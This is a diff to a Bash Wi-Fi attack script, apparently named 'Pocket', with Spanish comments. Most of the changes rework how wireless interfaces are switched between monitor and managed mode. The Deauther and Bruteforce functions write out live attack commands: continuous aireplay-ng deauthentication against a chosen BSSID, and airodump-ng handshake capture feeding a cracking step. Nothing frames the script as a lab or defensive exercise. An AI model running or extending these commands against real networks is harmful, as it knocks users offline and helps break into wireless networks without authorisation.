@@ -82,7 +82,8 @@ select_interface(){
     # Obtener la interfaz seleccionada
     SELECTED_INTERFACE="${INTERFACES[CHOICE-1]}"
 
-    if echo "$SELECTED_INTERFACE" | grep -q "mon"; then
+    MON_INTERFACE=""
+    if iw dev "$SELECTED_INTERFACE" info 2>/dev/null | grep -Eq '^[[:space:]]*type monitor[[:space:]]*$'; then
         MON_INTERFACE=$SELECTED_INTERFACE
         
     fi
@@ -95,101 +96,70 @@ select_interface(){
         exit 1
     fi
     
-    SELECTED_INTERFACE="${SELECTED_INTERFACE//mon/}"
+    if [[ "$SELECTED_INTERFACE" == *mon ]] && iw dev "${SELECTED_INTERFACE%mon}" info &>/dev/null; then
+        SELECTED_INTERFACE="${SELECTED_INTERFACE%mon}"
+    fi
     sleep 2
 }
-
-WIDTH=""
-HEIGHT=""
-CAL_WIDTH=""
-CAL_HEIGHT=""
-get_screen_resolution() {
-    if command -v xrandr &>/dev/null; then
-        resolution=$(xrandr --current | grep '*' | awk '{print $1}')
-        if [[ -n "$resolution" ]]; then
-            WIDTH=$(echo "$resolution" | cut -d'x' -f1)
-            HEIGHT=$(echo "$resolution" | cut -d'x' -f2)
-        else
-            return 1
-        fi
-    else
-        return 1
-    fi
-
-    CAL_WIDTH=$(( WIDTH / 3 ))
-    CAL_HEIGHT=$(( HEIGHT / 3 ))
-    return 0
-}
-
-open_terminal() {
-    local COMMAND_RUN="$1"
-    local SCREEN_SITE="$2"
-    #Se crea una ID falso para que se puede indentificar cada terminal abierta
-    local TERMINAL_TITLE="term_$(date +%s)_$RANDOM" 
-
-    # Abrir terminal en segundo plano
-    x-terminal-emulator -title "$TERMINAL_TITLE" -e "$COMMAND_RUN" &
-
-    # Esperar que la terminal se inicie
-    sleep 2
-
-    # Obtener ID de la ventana asociada al proceso
-    WINDOW_ID=$(wmctrl -l | grep "$TERMINAL_TITLE" | awk '{print $1}')
-
-    # Mover y redimensionar la terminal
-    if [[ -n "$WINDOW_ID" ]]; then
-        case "$SCREEN_SITE" in
-            "1") wmctrl -i -r "$WINDOW_ID" -e "0,0,0,$CAL_WIDTH,$CAL_HEIGHT" ;;   # Arriba Izquierda
-            "2") wmctrl -i -r "$WINDOW_ID" -e "0,$((WIDTH - CAL_WIDTH)),0,$CAL_WIDTH,$CAL_HEIGHT" ;; # Arriba Derecha
-            "3") wmctrl -i -r "$WINDOW_ID" -e "0,0,$((HEIGHT - CAL_HEIGHT)),$CAL_WIDTH,$CAL_HEIGHT" ;; # Abajo Izquierda
-            "4") wmctrl -i -r "$WINDOW_ID" -e "0,$((WIDTH - CAL_WIDTH)),$((HEIGHT - CAL_HEIGHT)),$CAL_WIDTH,$CAL_HEIGHT" ;; # Abajo Derecha
-            *) echo -e ""$BRED"[✗]"$NC" ERROR: invalid position" ;;
-        esac
-    else
-        echo -e ""$BRED"[✗]"$NC" No se pudo encontrar la ventana de la terminal."
-    fi
-}
-#Hago unas variables globales para que poder decidir la ubicacion 
-UP_LEFT="1"
-UP_RIGHT="2"
-DOWN_LEFT="3"
-DOWN_RIGHT="4"
 
 monitor_mode(){
-
-    if echo "$MON_INTERFACE" | grep -q "mon"; then
-        echo -e ""$BRED"[✗]"$NC"It's already in monitor mode"
-        SELECTED_INTERFACE="${SELECTED_INTERFACE//mon/}"
-        sleep 2
-
-    else
-        echo "[+] Activating monitor mode in $SELECTED_INTERFACE..."
-        #Verifica que no hayan procesos que interfieran con aircrack-ng
-        sudo airmon-ng check kill &>/dev/null 
-        sudo airmon-ng start "$SELECTED_INTERFACE" &>/dev/null
-        
-        # Verificar si la interfaz en modo monitor se creó
-        MON_INTERFACE="${SELECTED_INTERFACE}mon"
-        if iwconfig "$MON_INTERFACE" &>/dev/null; then
-            echo -e ""$GREEN"[✓]"$NC" Monitor mode activated in $MON_INTERFACE"
-        else
-            echo -e ""$BRED"[✗]"$NC" Error: Monitor mode could not be activated"
-            exit 1
-        fi
-        sleep 2
+    local interface info phy candidate
+    interface=${MON_INTERFACE:-$SELECTED_INTERFACE}
+    info=$(iw dev "$interface" info 2>/dev/null) || {
+        interface=$SELECTED_INTERFACE
+        info=$(iw dev "$interface" info) || return 1
+    }
+    phy=$(awk '$1 == "wiphy" {print $2}' <<< "$info")
+    if ! grep -Eq '^[[:space:]]*type monitor[[:space:]]*$' <<< "$info"; then
+        echo "[+] Activating monitor mode in $interface..."
+        sudo airmon-ng check kill || return 1
+        sudo airmon-ng start "$interface" || return 1
     fi
-    
-    
+    MON_INTERFACE=""
+    while read -r candidate; do
+        info=$(iw dev "$candidate" info 2>/dev/null) || continue
+        if [[ $(awk '$1 == "wiphy" {print $2}' <<< "$info") == "$phy" ]] &&
+            grep -Eq '^[[:space:]]*type monitor[[:space:]]*$' <<< "$info"; then
+            MON_INTERFACE=$candidate
+            break
+        fi
+    done < <(iw dev | awk '$1 == "Interface" {print $2}')
+    if [[ -z "$MON_INTERFACE" ]]; then
+        echo '[ERROR] No se encuentra una interfaz monitor en el adaptador seleccionado.' >&2
+        return 1
+    fi
+    # Reinitialise a stale monitor link when option 2 is selected again.
+    sudo ip link set dev "$MON_INTERFACE" down || return 1
+    sudo ip link set dev "$MON_INTERFACE" up || return 1
+    printf '[OK] Monitor mode activated in %s\n' "$MON_INTERFACE"
 }
 
 
 manager_mode(){
+    local phy candidate info managed=""
     
-    if echo "$MON_INTERFACE" | grep -q "mon"; then
+    if [[ -n "$MON_INTERFACE" ]]; then
+        info=$(iw dev "$MON_INTERFACE" info) || return 1
+        phy=$(awk '$1 == "wiphy" {print $2}' <<< "$info")
         echo "[+] Disabling monitor mode in $MON_INTERFACE..."
         #Verifica que no hayan procesos que interfieran con aircrack-ng
         sudo airmon-ng check kill &>/dev/null 
-        sudo airmon-ng stop "$MON_INTERFACE" &>/dev/null
+        sudo airmon-ng stop "$MON_INTERFACE" || return 1
+
+        # Drivers may restore the same name or rename wlan0mon to wlan0.
+        while read -r candidate; do
+            info=$(iw dev "$candidate" info 2>/dev/null) || continue
+            if [[ $(awk '$1 == "wiphy" {print $2}' <<< "$info") == "$phy" ]] &&
+                grep -Eq '^[[:space:]]*type managed[[:space:]]*$' <<< "$info"; then
+                managed=$candidate
+                break
+            fi
+        done < <(iw dev | awk '$1 == "Interface" {print $2}')
+        if [[ -z "$managed" ]]; then
+            echo '[ERROR] No se encuentra la interfaz restaurada en modo managed.' >&2
+            return 1
+        fi
+        SELECTED_INTERFACE=$managed
 
         if iwconfig "$SELECTED_INTERFACE" &>/dev/null; then
             echo -e ""$GREEN"[✓]"$NC" Manager mode activated in $SELECTED_INTERFACE"
@@ -373,19 +343,8 @@ Deauther(){
     TIMEOUT="$1"
     iwconfig $MON_INTERFACE channel $CHANNEL_VAR
 
-    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
-        # Estamos en un entorno gráfico
-        if get_screen_resolution ; then
-            ARRIBA_IZQ="1"
-            #Abre una terminal en una determinada posición 
-            open_terminal "timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE" "$UP_LEFT"
-        else
-            x-terminal-emulator -e " timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE"
-        fi
-    else
-        # No hay entorno gráfico, ejecutarlo en la terminal actual
-        nohup timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
-    fi
+    run_process_view 'Pocket: proceso de radio' timeout --foreground "$TIMEOUT" \
+        aireplay-ng --deauth 0 -a "$BSSID_VAR" "$MON_INTERFACE"
 
 }
 
@@ -435,23 +394,24 @@ Bruteforce(){
             #Cambiamos la interface al canal donde esta la red para poder hacer el ataque por el canal donde esta la red wifi.
             iwconfig $MON_INTERFACE channel $CHANNEL_VAR
 
-            if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
-                # Estamos en un entorno gráfico
-                Deauther "$TIMEOUT_USR" &
-
-                if get_screen_resolution ; then
-                    ARRIBA_DER="2"
-                    #Abre una terminal en una determinada posición 
-                    open_terminal "timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE" "$UP_RIGHT"
-                else
-                    x-terminal-emulator -e " timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE"
-                fi
-            else
-                # No hay entorno gráfico, ejecutarlo en la terminal actual
-                Deauther "$TIMEOUT_USR" &
-                nohup timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
-                echo "atack in progress"
-
+            # Separate views when available; both outputs remain visible inline.
+            run_process_view 'Pocket: proceso de radio' timeout --foreground "$TIMEOUT_USR" \
+                aireplay-ng --deauth 0 -a "$BSSID_VAR" "$MON_INTERFACE" &
+            local radio_pid=$! capture_status radio_status
+            run_process_view 'Pocket: captura' timeout --foreground "$TIMEOUT_USR" \
+                airodump-ng -w "$SCRIPT_DIRECTORY/data_collected/network_dump/wificapture" \
+                -c "$CHANNEL_VAR" --bssid "$BSSID_VAR" "$MON_INTERFACE"
+            capture_status=$?
+            if [[ $capture_status != 0 && $capture_status != 124 ]]; then
+                kill -TERM "$radio_pid" 2>/dev/null || true
+            fi
+            wait "$radio_pid"
+            radio_status=$?
+            if [[ $capture_status != 0 && $capture_status != 124 ]]; then
+                return "$capture_status"
+            fi
+            if [[ $radio_status != 0 && $radio_status != 124 ]]; then
+                return "$radio_status"
             fi
         
         else
@@ -459,9 +419,6 @@ Bruteforce(){
             return 1
         fi
     done
-
-    sleep $TIMEOUT_USR
-
 
     Craking_handshake
 
@@ -1441,7 +1398,7 @@ menu(){
             4) select_wireless ;;
             5) Bruteforce ;;
             6) ./hostapd_testing.sh 3;;
-            7) Deauther "0" ;;
+            7) Deauther "0" & ;;
             8) run_network_scanner ;;
             9) ./hostapd_testing.sh 1 ;;
             10) ./hostapd_testing.sh 2 ;;
